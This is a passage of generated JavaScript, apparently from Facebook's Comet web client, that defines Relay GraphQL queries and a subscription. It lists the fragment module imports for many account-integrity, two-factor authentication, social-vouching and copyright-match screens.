                    documentName: "CIXFacebookScreensRenderer_screen",
                    fragmentName:
                      "CometIXTAuthenticityWizardSocialVouchingVoucherDeclineRequestScreen_data",
                    fragmentPropName: "data",
                    kind: "ModuleImport",
                  },
                ],
                type: "XFBIXTSocialVouchingVoucherDeclineRequestScreenViewModel",
                abstractKey: null,
              },
              {
                kind: "InlineFragment",
                selections: [
                  {
                    args: null,
                    documentName: "CIXFacebookScreensRenderer_screen",
                    fragmentName:
                      "CometIXTAuthenticityWizardSocialVouchingVoucherExpiredScreen_data",
                    fragmentPropName: "data",
                    kind: "ModuleImport",
                  },
                ],
                type: "XFBIXTSocialVouchingVoucherExpiredScreenViewModel",
                abstractKey: null,
              },
              {
                kind: "InlineFragment",
                selections: [
                  {
                    args: null,
                    documentName: "CIXFacebookScreensRenderer_screen",
                    fragmentName:
                      "CometIXTAuthenticityWizardSocialVouchingVoucherOnboardingScreen_data",
                    fragmentPropName: "data",
                    kind: "ModuleImport",
                  },
                ],
                type: "XFBIXTSocialVouchingVoucherOnboardingScreenViewModel",
                abstractKey: null,
              },
              {
                kind: "InlineFragment",
                selections: [
                  {
                    args: null,
                    documentName: "CIXFacebookScreensRenderer_screen",
                    fragmentName:
                      "CometIXTAuthenticityWizardSocialVouchingVoucherOutroApproveScreen_data",
                    fragmentPropName: "data",
                    kind: "ModuleImport",
                  },
                ],
                type: "XFBIXTSocialVouchingVoucherOutroApproveScreenViewModel",
                abstractKey: null,
              },
              {
                kind: "InlineFragment",
                selections: [
                  {
                    args: null,
                    documentName: "CIXFacebookScreensRenderer_screen",
                    fragmentName:
                      "CometIXTAuthenticityWizardSocialVouchingVoucherOutroDeclineScreen_data",
                    fragmentPropName: "data",
                    kind: "ModuleImport",
                  },
                ],
                type: "XFBIXTSocialVouchingVoucherOutroDeclineScreenViewModel",
                abstractKey: null,
              },
              {
                kind: "InlineFragment",
                selections: [
                  {
                    args: null,
                    documentName: "CIXFacebookScreensRenderer_screen",
                    fragmentName:
                      "CometIXTAuthenticityWizardSocialVouchingVoucherOutroStopRequestsScreen_data",
                    fragmentPropName: "data",
                    kind: "ModuleImport",
                  },
                ],
                type: "XFBIXTSocialVouchingVoucherOutroStopRequestsScreenViewModel",
                abstractKey: null,
              },
              {
                kind: "InlineFragment",
                selections: [
                  {
                    args: null,
                    documentName: "CIXFacebookScreensRenderer_screen",
                    fragmentName: "CometIXTTwoFactorAddPhoneScreen_data",
                    fragmentPropName: "data",
                    kind: "ModuleImport",
                  },
                ],
                type: "IXTTwoFactorAddPhoneScreenViewModel",
                abstractKey: null,
              },
              {
                kind: "InlineFragment",
                selections: [
                  {
                    args: null,
                    documentName: "CIXFacebookScreensRenderer_screen",
                    fragmentName: "CometIXTTwoFactorFIDOScreen_data",
                    fragmentPropName: "data",
                    kind: "ModuleImport",
                  },
                ],
                type: "IXTTwoFactorFIDOScreenViewModel",
                abstractKey: null,
              },
              {
                kind: "InlineFragment",
                selections: [
                  {
                    args: null,
                    documentName: "CIXFacebookScreensRenderer_screen",
                    fragmentName: "CometIXTTwoFactorIntroScreen_data",
                    fragmentPropName: "data",
                    kind: "ModuleImport",
                  },
                ],
                type: "IXTTwoFactorIntroScreenViewModel",
                abstractKey: null,
              },
              {
                kind: "InlineFragment",
                selections: [
                  {
                    args: null,
                    documentName: "CIXFacebookScreensRenderer_screen",
                    fragmentName: "CometIXTTwoFactorOutroScreen_data",
                    fragmentPropName: "data",
                    kind: "ModuleImport",
                  },
                ],
                type: "IXTTwoFactorOutroScreenViewModel",
                abstractKey: null,
              },
              {
                kind: "InlineFragment",
                selections: [
                  {
                    args: null,
                    documentName: "CIXFacebookScreensRenderer_screen",
                    fragmentName: "CometIXTTwoFactorQRCodeScreen_data",
                    fragmentPropName: "data",
                    kind: "ModuleImport",
                  },
                ],
                type: "IXTTwoFactorQRCodeScreenViewModel",
                abstractKey: null,
              },
              {
                kind: "InlineFragment",
                selections: [
                  {
                    args: null,
                    documentName: "CIXFacebookScreensRenderer_screen",
                    fragmentName: "CometIXTTwoFactorSelectMethodScreen_data",
                    fragmentPropName: "data",
                    kind: "ModuleImport",
                  },
                ],
                type: "IXTTwoFactorSelectMethodScreenViewModel",
                abstractKey: null,
              },
              {
                kind: "InlineFragment",
                selections: [
                  {
                    args: null,
                    documentName: "CIXFacebookScreensRenderer_screen",
                    fragmentName: "CometIXTTwoFactorSelectPhoneScreen_data",
                    fragmentPropName: "data",
                    kind: "ModuleImport",
                  },
                ],
                type: "IXTTwoFactorSelectPhoneScreenViewModel",
                abstractKey: null,
              },
              {
                kind: "InlineFragment",
                selections: [
                  {
                    args: null,
                    documentName: "CIXFacebookScreensRenderer_screen",
                    fragmentName: "CometIXTTwoFactorTypeCodeScreen_data",
                    fragmentPropName: "data",
                    kind: "ModuleImport",
                  },
                ],
                type: "IXTTwoFactorTypeCodeScreenViewModel",
                abstractKey: null,
              },
              {
                kind: "InlineFragment",
                selections: [
                  {
                    args: null,
                    documentName: "CIXFacebookScreensRenderer_screen",
                    fragmentName: "CometIXTTwoFactorUpsellPhoneScreen_data",
                    fragmentPropName: "data",
                    kind: "ModuleImport",
                  },
                ],
                type: "IXTTwoFactorUpsellPhoneScreenViewModel",
                abstractKey: null,
              },
              {
                kind: "InlineFragment",
                selections: [
                  {
                    args: null,
                    documentName: "CIXFacebookScreensRenderer_screen",
                    fragmentName: "CometIXTUFACApp_data",
                    fragmentPropName: "data",
                    kind: "ModuleImport",
                  },
                ],
                type: "IXTUFACAppScreenViewModel",
                abstractKey: null,
              },
              {
                kind: "InlineFragment",
                selections: [
                  {
                    args: null,
                    documentName: "CIXFacebookScreensRenderer_screen",
                    fragmentName: "IXTitleBodyCometScreen_data",
                    fragmentPropName: "data",
                    kind: "ModuleImport",
                  },
                ],
                type: "IXTitleBodyScreenViewModel",
                abstractKey: null,
              },
              {
                kind: "InlineFragment",
                selections: [
                  {
                    args: null,
                    documentName: "CIXFacebookScreensRenderer_screen",
                    fragmentName: "CometCommunityStandardsLearnMoreModal_data",
                    fragmentPropName: "data",
                    kind: "ModuleImport",
                  },
                ],
                type: "InformTreatmentLearnMoreScreenViewModel",
                abstractKey: null,
              },
              {
                kind: "InlineFragment",
                selections: [
                  {
                    args: null,
                    documentName: "CIXFacebookScreensRenderer_screen",
                    fragmentName: "CometIntegrityHubAccountStatusScreen_data",
                    fragmentPropName: "data",
                    kind: "ModuleImport",
                  },
                ],
                type: "IntegrityHubAccountStatusScreenViewModel",
                abstractKey: null,
              },
              {
                kind: "InlineFragment",
                selections: [
                  {
                    args: null,
                    documentName: "CIXFacebookScreensRenderer_screen",
                    fragmentName: "CometAccountStatusActionsListScreen_data",
                    fragmentPropName: "data",
                    kind: "ModuleImport",
                  },
                ],
                type: "IntegrityHubActionsListScreenViewModel",
                abstractKey: null,
              },
              {
                kind: "InlineFragment",
                selections: [
                  {
                    args: null,
                    documentName: "CIXFacebookScreensRenderer_screen",
                    fragmentName: "CometIntegrityHubProfileStatusScreen_data",
                    fragmentPropName: "data",
                    kind: "ModuleImport",
                  },
                ],
                type: "IntegrityHubProfileStatusScreenViewModel",
                abstractKey: null,
              },
              {
                kind: "InlineFragment",
                selections: [
                  {
                    args: null,
                    documentName: "CIXFacebookScreensRenderer_screen",
                    fragmentName:
                      "M21HarassmentKeepingItFriendlyHomeScreenComet_data",
                    fragmentPropName: "data",
                    kind: "ModuleImport",
                  },
                ],
                type: "M21HarassmentKeepingItFriendlyScreenViewModel",
                abstractKey: null,
              },
              {
                kind: "InlineFragment",
                selections: [
                  {
                    args: null,
                    documentName: "CIXFacebookScreensRenderer_screen",
                    fragmentName: "CometMisinfoSeeWhyIXTScreen_data",
                    fragmentPropName: "data",
                    kind: "ModuleImport",
                  },
                ],
                type: "MisInfoSeeWhyInformTreatmentFollowUpScreenViewModel",
                abstractKey: null,
              },
              {
                kind: "InlineFragment",
                selections: [
                  {
                    args: null,
                    documentName: "CIXFacebookScreensRenderer_screen",
                    fragmentName:
                      "CometNFXActionBlockActorConfirmationScreen_data",
                    fragmentPropName: "data",
                    kind: "ModuleImport",
                  },
                ],
                type: "NFXActionBlockActorConfirmationScreenViewModel",
                abstractKey: null,
              },
              {
                kind: "InlineFragment",
                selections: [
                  {
                    args: null,
                    documentName: "CIXFacebookScreensRenderer_screen",
                    fragmentName:
                      "CometNFXActionBlockPageConfirmationScreen_data",
                    fragmentPropName: "data",
                    kind: "ModuleImport",
                  },
                ],
                type: "NFXActionBlockPageConfirmationScreenViewModel",
                abstractKey: null,
              },
              {
                kind: "InlineFragment",
                selections: [
                  {
                    args: null,
                    documentName: "CIXFacebookScreensRenderer_screen",
                    fragmentName: "CometNFXActionUnfriendConfirmationScreen_data",
                    fragmentPropName: "data",
                    kind: "ModuleImport",
                  },
                ],
                type: "NFXActionUnfriendConfirmationScreenViewModel",
                abstractKey: null,
              },
              {
                kind: "InlineFragment",
                selections: [
                  {
                    args: null,
                    documentName: "CIXFacebookScreensRenderer_screen",
                    fragmentName: "CometNFXActionUnlikeConfirmationScreen_data",
                    fragmentPropName: "data",
                    kind: "ModuleImport",
                  },
                ],
                type: "NFXActionUnlikeConfirmationScreenViewModel",
                abstractKey: null,
              },
              {
                kind: "InlineFragment",
                selections: [
                  {
                    args: null,
                    documentName: "CIXFacebookScreensRenderer_screen",
                    fragmentName:
                      "CometNFXActionUnsubscribeConfirmationScreen_data",
                    fragmentPropName: "data",
                    kind: "ModuleImport",
                  },
                ],
                type: "NFXActionUnsubscribeConfirmationScreenViewModel",
                abstractKey: null,
              },
              {
                kind: "InlineFragment",
                selections: [
                  {
                    args: null,
                    documentName: "CIXFacebookScreensRenderer_screen",
                    fragmentName: "CometNFXActionUntagConfirmationScreen_data",
                    fragmentPropName: "data",
                    kind: "ModuleImport",
                  },
                ],
                type: "NFXActionUntagConfirmationScreenViewModel",
                abstractKey: null,
              },
              {
                kind: "InlineFragment",
                selections: [
                  {
                    args: null,
                    documentName: "CIXFacebookScreensRenderer_screen",
                    fragmentName: "CometNewsworthySeeWhyIXTScreen_data",
                    fragmentPropName: "data",
                    kind: "ModuleImport",
                  },
                ],
                type: "NewsworthySeeWhyInformTreatmentFollowUpScreenViewModel",
                abstractKey: null,
              },
              {
                kind: "InlineFragment",
                selections: [
                  {
                    args: null,
                    documentName: "CIXFacebookScreensRenderer_screen",
                    fragmentName:
                      "CometPH2022FAVITElectionPreparationsIXTScreen_data",
                    fragmentPropName: "data",
                    kind: "ModuleImport",
                  },
                ],
                type: "PH2022FAVITElectionPreparationsInformTreatmentFollowUpScreenViewModel",
                abstractKey: null,
              },
              {
                kind: "InlineFragment",
                selections: [
                  {
                    args: null,
                    documentName: "CIXFacebookScreensRenderer_screen",
                    fragmentName: "PTFCommunityStandardsCometScreen_data",
                    fragmentPropName: "data",
                    kind: "ModuleImport",
                  },
                ],
                type: "XFBPTFCommunityStandardsScreenViewModel",
                abstractKey: null,
              },
              {
                kind: "InlineFragment",
                selections: [
                  {
                    args: null,
                    documentName: "CIXFacebookScreensRenderer_screen",
                    fragmentName: "PTFSeeWhyCometScreen_data",
                    fragmentPropName: "data",
                    kind: "ModuleImport",
                  },
                ],
                type: "XFBPTFSeeWhyScreenViewModel",
                abstractKey: null,
              },
              {
                kind: "InlineFragment",
                selections: [
                  {
                    args: null,
                    documentName: "CIXFacebookScreensRenderer_screen",
                    fragmentName: "CometPolicyEducationScreen_data",
                    fragmentPropName: "data",
                    kind: "ModuleImport",
                  },
                ],
                type: "PolicyEducationScreenViewModel",
                abstractKey: null,
              },
              {
                kind: "InlineFragment",
                selections: [
                  {
                    args: null,
                    documentName: "CIXFacebookScreensRenderer_screen",
                    fragmentName:
                      "CometIXTProactiveWarningFollowUpActionsScreen_data",
                    fragmentPropName: "data",
                    kind: "ModuleImport",
                  },
                ],
                type: "ProactiveWarningFlowDefaultScreenViewModel",
                abstractKey: null,
              },
              {
                kind: "InlineFragment",
                selections: [
                  {
                    args: null,
                    documentName: "CIXFacebookScreensRenderer_screen",
                    fragmentName: "CometProfilePlusAdminEducationScreen_data",
                    fragmentPropName: "data",
                    kind: "ModuleImport",
                  },
                ],
                type: "ProfilePlusAdminEducationScreenViewModel",
                abstractKey: null,
              },
              {
                kind: "InlineFragment",
                selections: [
                  {
                    args: null,
                    documentName: "CIXFacebookScreensRenderer_screen",
                    fragmentName:
                      "CometProfilePlusAdminVoiceOnboardingScreen_data",
                    fragmentPropName: "data",
                    kind: "ModuleImport",
                  },
                ],
                type: "ProfilePlusAdminVoiceOnboardingScreenViewModel",
                abstractKey: null,
              },
              {
                kind: "InlineFragment",
                selections: [
                  {
                    args: null,
                    documentName: "CIXFacebookScreensRenderer_screen",
                    fragmentName: "CometProfilePlusEducationNuxTourScreen_data",
                    fragmentPropName: "data",
                    kind: "ModuleImport",
                  },
                ],
                type: "ProfilePlusEducationNuxTourScreenViewModel",
                abstractKey: null,
              },
              {
                kind: "InlineFragment",
                selections: [
                  {
                    args: null,
                    documentName: "CIXFacebookScreensRenderer_screen",
                    fragmentName: "CometProfilePlusPrivacyTakeoverScreen_data",
                    fragmentPropName: "data",
                    kind: "ModuleImport",
                  },
                ],
                type: "ProfilePlusPrivacyTakeoverScreenViewModel",
                abstractKey: null,
              },
              {
                kind: "InlineFragment",
                selections: [
                  {
                    args: null,
                    documentName: "CIXFacebookScreensRenderer_screen",
                    fragmentName: "IXTReshareWarningTemplateRenderer_data",
                    fragmentPropName: "data",
                    kind: "ModuleImport",
                  },
                ],
                type: "ReshareWarningTemplateScreenViewModel",
                abstractKey: null,
              },
              {
                kind: "InlineFragment",
                selections: [
                  {
                    args: null,
                    documentName: "CIXFacebookScreensRenderer_screen",
                    fragmentName:
                      "SSIResourcesEatingDisordersHomeCometScreenIXT_data",
                    fragmentPropName: "data",
                    kind: "ModuleImport",
                  },
                ],
                type: "SSIResourcesEatingDisordersHomeScreenViewModel",
                abstractKey: null,
              },
              {
                kind: "InlineFragment",
                selections: [
                  {
                    args: null,
                    documentName: "CIXFacebookScreensRenderer_screen",
                    fragmentName: "CometUFACDelayedOutroScreen_data",
                    fragmentPropName: "data",
                    kind: "ModuleImport",
                  },
                ],
                type: "UFACDelayedOutroScreenViewModel",
                abstractKey: null,
              },
              {
                kind: "InlineFragment",
                selections: [
                  {
                    args: null,
                    documentName: "CIXFacebookScreensRenderer_screen",
                    fragmentName: "PTFHomeCometScreen_data",
                    fragmentPropName: "data",
                    kind: "ModuleImport",
                  },
                ],
                type: "XFBPTFHomeV2ScreenViewModel",
                abstractKey: null,
              },
              {
                kind: "InlineFragment",
                selections: [
                  {
                    args: null,
                    documentName: "CIXFacebookScreensRenderer_screen",
                    fragmentName: "WhyWeRemovedCommentsScreenComet_data",
                    fragmentPropName: "data",
                    kind: "ModuleImport",
                  },
                ],
                type: "WhyWeRemovedCommentsScreenViewModel",
                abstractKey: null,
              },
              {
                kind: "InlineFragment",
                selections: [e],
                type: "Node",
                abstractKey: "__isNode",
              },
            ],
            storageKey: null,
          };
        return {
          fragment: {
            argumentDefinitions: a,
            kind: "Fragment",
            metadata: null,
            name: "CometActorGatewayHandlerQuery",
            selections: [
              {
                alias: null,
                args: null,
                concreteType: "XFBActorGatewayScreen",
                kind: "LinkedField",
                name: "xfb_actor_gateway_open_experience",
                plural: !1,
                selections: [
                  {
                    alias: null,
                    args: null,
                    concreteType: null,
                    kind: "LinkedField",
                    name: "screen",
                    plural: !1,
                    selections: [
                      {
                        args: null,
                        kind: "FragmentSpread",
                        name: "CIXFacebookScreensRenderer_screen",
                      },
                    ],
                    storageKey: null,
                  },
                  b,
                  {
                    alias: null,
                    args: null,
                    concreteType: "QuickPromotion",
                    kind: "LinkedField",
                    name: "quick_promotion",
                    plural: !1,
                    selections: [
                      {
                        alias: null,
                        args: null,
                        concreteType: "CometQuickPromotionSections",
                        kind: "LinkedField",
                        name: "comet_qp_sections",
                        plural: !1,
                        selections: [
                          {
                            alias: null,
                            args: c,
                            concreteType: null,
                            kind: "LinkedField",
                            name: "renderer_strategy",
                            plural: !1,
                            selections: [
                              {
                                kind: "InlineFragment",
                                selections: [
                                  {
                                    args: null,
                                    kind: "FragmentSpread",
                                    name: "CometQuickPromotionServerDrivenPromptRendererStrategy_quickPromotion",
                                  },
                                ],
                                type: "CometQuickPromotionServerDrivenPromptRendererStrategy",
                                abstractKey: null,
                              },
                            ],
                            storageKey: 'renderer_strategy(supported:"4vG8Rw")',
                          },
                        ],
                        storageKey: null,
                      },
                    ],
                    storageKey: null,
                  },
                ],
                storageKey: null,
              },
            ],
            type: "Query",
            abstractKey: null,
          },
          kind: "Request",
          operation: {
            argumentDefinitions: a,
            kind: "Operation",
            name: "CometActorGatewayHandlerQuery",
            selections: [
              {
                alias: null,
                args: null,
                concreteType: "XFBActorGatewayScreen",
                kind: "LinkedField",
                name: "xfb_actor_gateway_open_experience",
                plural: !1,
                selections: [
                  f,
                  b,
                  {
                    alias: null,
                    args: null,
                    concreteType: "QuickPromotion",
                    kind: "LinkedField",
                    name: "quick_promotion",
                    plural: !1,
                    selections: [
                      {
                        alias: null,
                        args: null,
                        concreteType: "CometQuickPromotionSections",
                        kind: "LinkedField",
                        name: "comet_qp_sections",
                        plural: !1,
                        selections: [
                          {
                            alias: null,
                            args: c,
                            concreteType: null,
                            kind: "LinkedField",
                            name: "renderer_strategy",
                            plural: !1,
                            selections: [
                              d,
                              {
                                kind: "InlineFragment",
                                selections: [
                                  {
                                    alias: null,
                                    args: null,
                                    concreteType:
                                      "XFBActorGatewayIXTCompatibleScreenPayload",
                                    kind: "LinkedField",
                                    name: "ixt_schema_compatible_enrollment_screen_payload",
                                    plural: !1,
                                    selections: [f, b],
                                    storageKey: null,
                                  },
                                ],
                                type: "CometQuickPromotionServerDrivenPromptRendererStrategy",
                                abstractKey: null,
                              },
                            ],
                            storageKey: 'renderer_strategy(supported:"4vG8Rw")',
                          },
                        ],
                        storageKey: null,
                      },
                      e,
                    ],
                    storageKey: null,
                  },
                ],
                storageKey: null,
              },
            ],
          },
          params: {
            id: "7261134853962803",
            metadata: {},
            name: "CometActorGatewayHandlerQuery",
            operationKind: "query",
            text: null,
          },
        };
      })();
      b("relay-runtime").PreloadableQueryRegistry.set(a.params.id, a);
      e.exports = a;
    },
    null
  );
  __d(
    "CometActorGatewayExperienceSubscription_facebookRelayOperation",
    [],
    function (a, b, c, d, e, f) {
      e.exports = "7334228839933127";
    },
    null
  );
  __d(
    "CometActorGatewayExperienceSubscription.graphql",
    ["CometActorGatewayExperienceSubscription_facebookRelayOperation"],
    function (a, aa, b, c, d, e) {
      "use strict";
      a = (function () {
        var a = [
            { defaultValue: null, kind: "LocalArgument", name: "input" },
            { defaultValue: null, kind: "LocalArgument", name: "scale" },
          ],
          b = [{ kind: "Variable", name: "data", variableName: "input" }],
          c = {
            alias: null,
            args: null,
            kind: "ScalarField",
            name: "session_id",
            storageKey: null,
          },
          d = {
            args: null,
            kind: "FragmentSpread",
            name: "CIXFacebookScreensRenderer_screen",
          },
          e = {
            alias: null,
            args: null,
            kind: "ScalarField",
            name: "presentation_style",
            storageKey: null,
          },
          f = [{ kind: "Literal", name: "supported", value: "4vG8Rw" }],
          g = {
            alias: null,
            args: null,
            kind: "ScalarField",
            name: "__typename",
            storageKey: null,
          },
          h = {
            kind: "TypeDiscriminator",
            abstractKey: "__isCIXScreenViewModel",
          },
          i = {
            kind: "InlineFragment",
            selections: [
              {
                args: null,
                documentName: "CIXFacebookScreensRenderer_screen",
                fragmentName: "AFXAboutOurDecisionCometScreen_data",
                fragmentPropName: "data",
                kind: "ModuleImport",
              },
            ],
            type: "AFXAboutOurDecisionScreenViewModel",
            abstractKey: null,
          },
          j = {
            kind: "InlineFragment",
            selections: [
              {
                args: null,
                documentName: "CIXFacebookScreensRenderer_screen",
                fragmentName:
                  "AFXBlackholeCommunityStandardDetailsCometScreen_data",
                fragmentPropName: "data",
                kind: "ModuleImport",
              },
            ],
            type: "AFXBlackholeCommunityStandardDetailsScreenViewModel",
            abstractKey: null,
          },
          k = {
            kind: "InlineFragment",
            selections: [
              {
                args: null,
                documentName: "CIXFacebookScreensRenderer_screen",
                fragmentName: "AFXBlackholeCommunityStandardCometScreen_data",
                fragmentPropName: "data",
                kind: "ModuleImport",
              },
            ],
            type: "AFXBlackholeCommunityStandardScreenViewModel",
            abstractKey: null,
          },
          l = {
            kind: "InlineFragment",
            selections: [
              {
                args: null,
                documentName: "CIXFacebookScreensRenderer_screen",
                fragmentName: "AFXBlackholeFeedbackOptionsCometScreen_data",
                fragmentPropName: "data",
                kind: "ModuleImport",
              },
            ],
            type: "AFXBlackholeFeedbackOptionsScreenViewModel",
            abstractKey: null,
          },
          m = {
            kind: "InlineFragment",
            selections: [
              {
                args: null,
                documentName: "CIXFacebookScreensRenderer_screen",
                fragmentName: "AFXBlackholeInitialCometScreen_data",
                fragmentPropName: "data",
                kind: "ModuleImport",
              },
            ],
            type: "AFXBlackholeInitialScreenViewModel",
            abstractKey: null,
          },
          n = {
            kind: "InlineFragment",
            selections: [
              {
                args: null,
                documentName: "CIXFacebookScreensRenderer_screen",
                fragmentName: "AFXBypassLoginInterstitialCometScreen_data",
                fragmentPropName: "data",
                kind: "ModuleImport",
              },
            ],
            type: "AFXBypassLoginInterstitialScreenViewModel",
            abstractKey: null,
          },
          o = {
            kind: "InlineFragment",
            selections: [
              {
                args: null,
                documentName: "CIXFacebookScreensRenderer_screen",
                fragmentName: "AFXCommunityStandardsCometScreen_data",
                fragmentPropName: "data",
                kind: "ModuleImport",
              },
            ],
            type: "AFXCommunityStandardsScreenViewModel",
            abstractKey: null,
          },
          p = {
            kind: "InlineFragment",
            selections: [
              {
                args: null,
                documentName: "CIXFacebookScreensRenderer_screen",
                fragmentName: "AFXConfirmFeedbackOptionCometScreen_data",
                fragmentPropName: "data",
                kind: "ModuleImport",
              },
            ],
            type: "AFXConfirmFeedbackOptionScreenViewModel",
            abstractKey: null,
          },
          q = {
            kind: "InlineFragment",
            selections: [
              {
                args: null,
                documentName: "CIXFacebookScreensRenderer_screen",
                fragmentName: "CometAFXCopyrightMatchAboutScreen_data",
                fragmentPropName: "data",
                kind: "ModuleImport",
              },
            ],
            type: "AFXCopyrightMatchAboutScreenViewModel",
            abstractKey: null,
          },
          r = {
            kind: "InlineFragment",
            selections: [
              {
                args: null,
                documentName: "CIXFacebookScreensRenderer_screen",
                fragmentName: "CometAFXCopyrightMatchActionDetailScreen_data",
                fragmentPropName: "data",
                kind: "ModuleImport",
              },
            ],
            type: "AFXCopyrightMatchActionDetailScreenViewModel",
            abstractKey: null,
          },
          s = {
            kind: "InlineFragment",
            selections: [
              {
                args: null,
                documentName: "CIXFacebookScreensRenderer_screen",
                fragmentName: "CometAFXCopyrightMatchConfirmOptionScreen_data",
                fragmentPropName: "data",
                kind: "ModuleImport",
              },
            ],
            type: "AFXCopyrightMatchConfirmOptionScreenViewModel",
            abstractKey: null,
          },
          t = {
            kind: "InlineFragment",
            selections: [
              {
                args: null,
                documentName: "CIXFacebookScreensRenderer_screen",
                fragmentName: "CometAFXCopyrightMatchFeedbackOptionsScreen_data",
                fragmentPropName: "data",
                kind: "ModuleImport",
              },
            ],
            type: "AFXCopyrightMatchFeedbackOptionsScreenViewModel",
            abstractKey: null,
          },
          u = {
            kind: "InlineFragment",
            selections: [
              {
                args: null,
                documentName: "CIXFacebookScreensRenderer_screen",
                fragmentName: "CometAFXCopyrightMatchFollowUpScreen_data",
                fragmentPropName: "data",
                kind: "ModuleImport",
              },
            ],
            type: "AFXCopyrightMatchFollowUpScreenViewModel",
            abstractKey: null,
          },
          v = {
            kind: "InlineFragment",
            selections: [
              {
                args: null,
                documentName: "CIXFacebookScreensRenderer_screen",
                fragmentName: "CometAFXCopyrightMatchFormScreen_data",
                fragmentPropName: "data",
                kind: "ModuleImport",
              },
            ],
            type: "AFXCopyrightMatchFormScreenViewModel",
            abstractKey: null,
          },
          w = {
            kind: "InlineFragment",
            selections: [
              {
                args: null,
                documentName: "CIXFacebookScreensRenderer_screen",
                fragmentName: "CometAFXCopyrightMatchOverviewScreen_data",
                fragmentPropName: "data",
                kind: "ModuleImport",
              },
            ],
            type: "AFXCopyrightMatchOverviewScreenViewModel",
            abstractKey: null,
          },
          x = {
            kind: "InlineFragment",
            selections: [
              {
                args: null,
                documentName: "CIXFacebookScreensRenderer_screen",
                fragmentName: "CometAFXCopyrightMatchPolicyScreen_data",
                fragmentPropName: "data",
                kind: "ModuleImport",
              },
            ],
            type: "AFXCopyrightMatchPolicyScreenViewModel",
            abstractKey: null,
          },
          y = {
            kind: "InlineFragment",
            selections: [
              {
                args: null,
                documentName: "CIXFacebookScreensRenderer_screen",
                fragmentName: "CometAFXCopyrightMatchSegmentSelectorScreen_data",
                fragmentPropName: "data",
                kind: "ModuleImport",
              },
            ],
            type: "AFXCopyrightMatchSegmentSelectorScreenViewModel",
            abstractKey: null,
          },
          z = {
            kind: "InlineFragment",
            selections: [
              {
                args: null,
                documentName: "CIXFacebookScreensRenderer_screen",
                fragmentName: "AFXExampleCometScreen_data",
                fragmentPropName: "data",
                kind: "ModuleImport",
              },
            ],
            type: "AFXExampleScreenViewModel",
            abstractKey: null,
          },
          A = {
            kind: "InlineFragment",
            selections: [
              {
                args: null,
                documentName: "CIXFacebookScreensRenderer_screen",
                fragmentName: "AFXFeedbackFollowUpCometScreen_data",
                fragmentPropName: "data",
                kind: "ModuleImport",
              },
            ],
            type: "AFXFeedbackFollowUpScreenViewModel",
            abstractKey: null,
          },
          B = {
            kind: "InlineFragment",
            selections: [
              {
                args: null,
                documentName: "CIXFacebookScreensRenderer_screen",
                fragmentName: "AFXFeedbackOptionsCometScreen_data",
                fragmentPropName: "data",
                kind: "ModuleImport",
              },
            ],
            type: "AFXFeedbackOptionsScreenViewModel",
            abstractKey: null,
          },
          C = {
            kind: "InlineFragment",
            selections: [
              {
                args: null,
                documentName: "CIXFacebookScreensRenderer_screen",
                fragmentName: "AFXHeadsUpCometScreen_data",
                fragmentPropName: "data",
                kind: "ModuleImport",
              },
            ],
            type: "AFXHeadsUpScreenViewModel",
            abstractKey: null,
          },
          D = {
            kind: "InlineFragment",
            selections: [
              {
                args: null,
                documentName: "CIXFacebookScreensRenderer_screen",
                fragmentName: "AFXIntegrityErrorComplexDialogCometScreen_data",
                fragmentPropName: "data",
                kind: "ModuleImport",
              },
            ],
            type: "AFXIntegrityErrorComplexDialogScreenViewModel",
            abstractKey: null,
          },
          E = {
            kind: "InlineFragment",
            selections: [
              {
                args: null,
                documentName: "CIXFacebookScreensRenderer_screen",
                fragmentName:
                  "AFXIntegrityErrorDefaultExperienceCometScreen_data",
                fragmentPropName: "data",
                kind: "ModuleImport",
              },
            ],
            type: "AFXIntegrityErrorDefaultExperienceScreenViewModel",
            abstractKey: null,
          },
          F = {
            kind: "InlineFragment",
            selections: [
              {
                args: null,
                documentName: "CIXFacebookScreensRenderer_screen",
                fragmentName:
                  "AFXIntegrityErrorFLXViolationsHistoryDialogCometScreen_data",
                fragmentPropName: "data",
                kind: "ModuleImport",
              },
            ],
            type: "AFXIntegrityErrorFLXViolationsHistoryDialogScreenViewModel",
            abstractKey: null,
          },
          G = {
            kind: "InlineFragment",
            selections: [
              {
                args: null,
                documentName: "CIXFacebookScreensRenderer_screen",
                fragmentName: "AFXItemOverviewCometScreen_data",
                fragmentPropName: "data",
                kind: "ModuleImport",
              },
            ],
            type: "AFXItemOverviewScreenViewModel",
            abstractKey: null,
          },
          H = {
            kind: "InlineFragment",
            selections: [
              {
                args: null,
                documentName: "CIXFacebookScreensRenderer_screen",
                fragmentName: "AFXMultipleItemsOverviewCometScreen_data",
                fragmentPropName: "data",
                kind: "ModuleImport",
              },
            ],
            type: "AFXMultipleItemsOverviewScreenViewModel",
            abstractKey: null,
          },
          I = {
            kind: "InlineFragment",
            selections: [
              {
                args: null,
                documentName: "CIXFacebookScreensRenderer_screen",
                fragmentName: "AFXNonTessaSurveyCometScreen_data",
                fragmentPropName: "data",
                kind: "ModuleImport",
              },
            ],
            type: "AFXNonTessaSurveyScreenViewModel",
            abstractKey: null,
          },
          J = {
            kind: "InlineFragment",
            selections: [
              {
                args: null,
                documentName: "CIXFacebookScreensRenderer_screen",
                fragmentName: "AFXOBInvitedToShareInfoCometScreen_data",
                fragmentPropName: "data",
                kind: "ModuleImport",
              },
            ],
            type: "AFXOBInvitedToShareInfoScreenViewModel",
            abstractKey: null,
          },
          K = {
            kind: "InlineFragment",
            selections: [
              {
                args: null,
                documentName: "CIXFacebookScreensRenderer_screen",
                fragmentName: "AFXObFbrcGatewayNoticeCometScreen_data",
                fragmentPropName: "data",
                kind: "ModuleImport",
              },
            ],
            type: "AFXObFbrcGatewayNoticeScreenViewModel",
            abstractKey: null,
          },
          L = {
            kind: "InlineFragment",
            selections: [
              {
                args: null,
                documentName: "CIXFacebookScreensRenderer_screen",
                fragmentName: "AFXObFbrcShareContextCometScreen_data",
                fragmentPropName: "data",
                kind: "ModuleImport",
              },
            ],
            type: "AFXObFbrcShareContextScreenViewModel",
            abstractKey: null,
          },
          M = {
            kind: "InlineFragment",
            selections: [
              {
                args: null,
                documentName: "CIXFacebookScreensRenderer_screen",
                fragmentName:
                  "CometAFXProfilePlusAdminlessTransitionCPNScreen_data",
                fragmentPropName: "data",
                kind: "ModuleImport",
              },
            ],
            type: "AFXProfilePlusAdminlessTransitionCPNScreenViewModel",
            abstractKey: null,
          },
          N = {
            kind: "InlineFragment",
            selections: [
              {
                args: null,
                documentName: "CIXFacebookScreensRenderer_screen",
                fragmentName:
                  "CometAFXProfilePlusBizAdminOnboardingAcceptAccessScreen_data",
                fragmentPropName: "data",
                kind: "ModuleImport",
              },
            ],
